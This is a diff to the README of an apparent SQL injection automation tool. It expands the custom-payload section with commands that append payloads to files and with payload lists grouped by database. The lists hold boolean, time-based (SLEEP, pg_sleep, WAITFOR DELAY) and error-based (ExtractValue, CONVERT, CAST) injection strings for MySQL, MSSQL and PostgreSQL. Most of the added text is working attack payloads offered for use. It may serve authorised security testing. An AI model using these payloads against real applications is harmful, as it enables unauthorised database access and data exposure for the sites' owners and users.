@@ -108,15 +108,81 @@ sqli_automator/
 
 ##  Advanced Configuration
 
-### Custom Payloads
-Add your own payloads to the text files in the `payloads/` directory:
+### Custom Payloads - NEW & IMPROVED! 🎯
+
+The tool now features **smart payload management** that makes it incredibly easy to work with new payloads:
+
+#### Adding New Payloads
+Simply add payloads to the text files in the `payloads/` directory - **one payload per line**:
 
 ```bash
 # Add custom boolean payloads
-echo "custom' OR '1'='1" >> payloads/boolean_payloads.txt
+echo "' OR 1=1 LIMIT 1--" >> payloads/boolean_payloads.txt
 
 # Add custom time-based payloads  
 echo "'; SELECT pg_sleep(10)--" >> payloads/time_payloads.txt
+
+# Add comments for organization (lines starting with # are ignored)
+echo "# MySQL-specific payloads" >> payloads/error_payloads.txt
+echo "' AND ExtractValue(1,CONCAT(0x5c,version()))--" >> payloads/error_payloads.txt
+```
+
+#### Smart Payload Features
+
+The script now includes intelligent payload handling:
+
+1. **Automatic Deduplication**: Duplicate payloads are automatically removed
+2. **Normalization**: Whitespace is normalized for consistency  
+3. **Smart Ordering**: Payloads are ordered by complexity (simple → complex)
+4. **No Limits**: By default, ALL payloads from files are used (configurable)
+5. **Error Recovery**: Built-in fallback payloads if files are missing
+
+#### Configuration Options
+
+Edit `config.py` to customize payload behavior:
+
+```python
+# Payload configurations
+MAX_PAYLOADS_PER_TEST = None  # None = use all payloads, or set a number
+SKIP_DUPLICATE_PAYLOADS = True  # Automatically remove duplicates
+NORMALIZE_PAYLOADS = True  # Clean whitespace
+SMART_PAYLOAD_ORDERING = True  # Order by effectiveness
+```
+
+#### Payload File Format
+
+Create clean, readable payload files:
+
+```
+# Boolean-based payloads for MySQL
+' OR '1'='1
+' OR '1'='2
+' AND 1=1--
+' AND 1=2--
+
+# Advanced Boolean payloads
+' OR EXISTS(SELECT 1 FROM users)--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10--
+
+# Comments and blank lines are ignored
+```
+
+#### Database-Specific Payloads
+
+Organize payloads by database type for better results:
+
+```bash
+# MySQL payloads use SLEEP, BENCHMARK, ExtractValue
+' AND SLEEP(5)--
+' AND BENCHMARK(5000000,MD5('test'))--
+
+# MSSQL payloads use WAITFOR, CONVERT
+' AND WAITFOR DELAY '0:0:5'--
+' AND 1=CONVERT(int,(SELECT @@version))--
+
+# PostgreSQL payloads use pg_sleep, CAST
+' AND pg_sleep(5)--
+' AND 1=CAST((SELECT version()) AS int)--
 ```
 
 ### HTTP Client Configuration
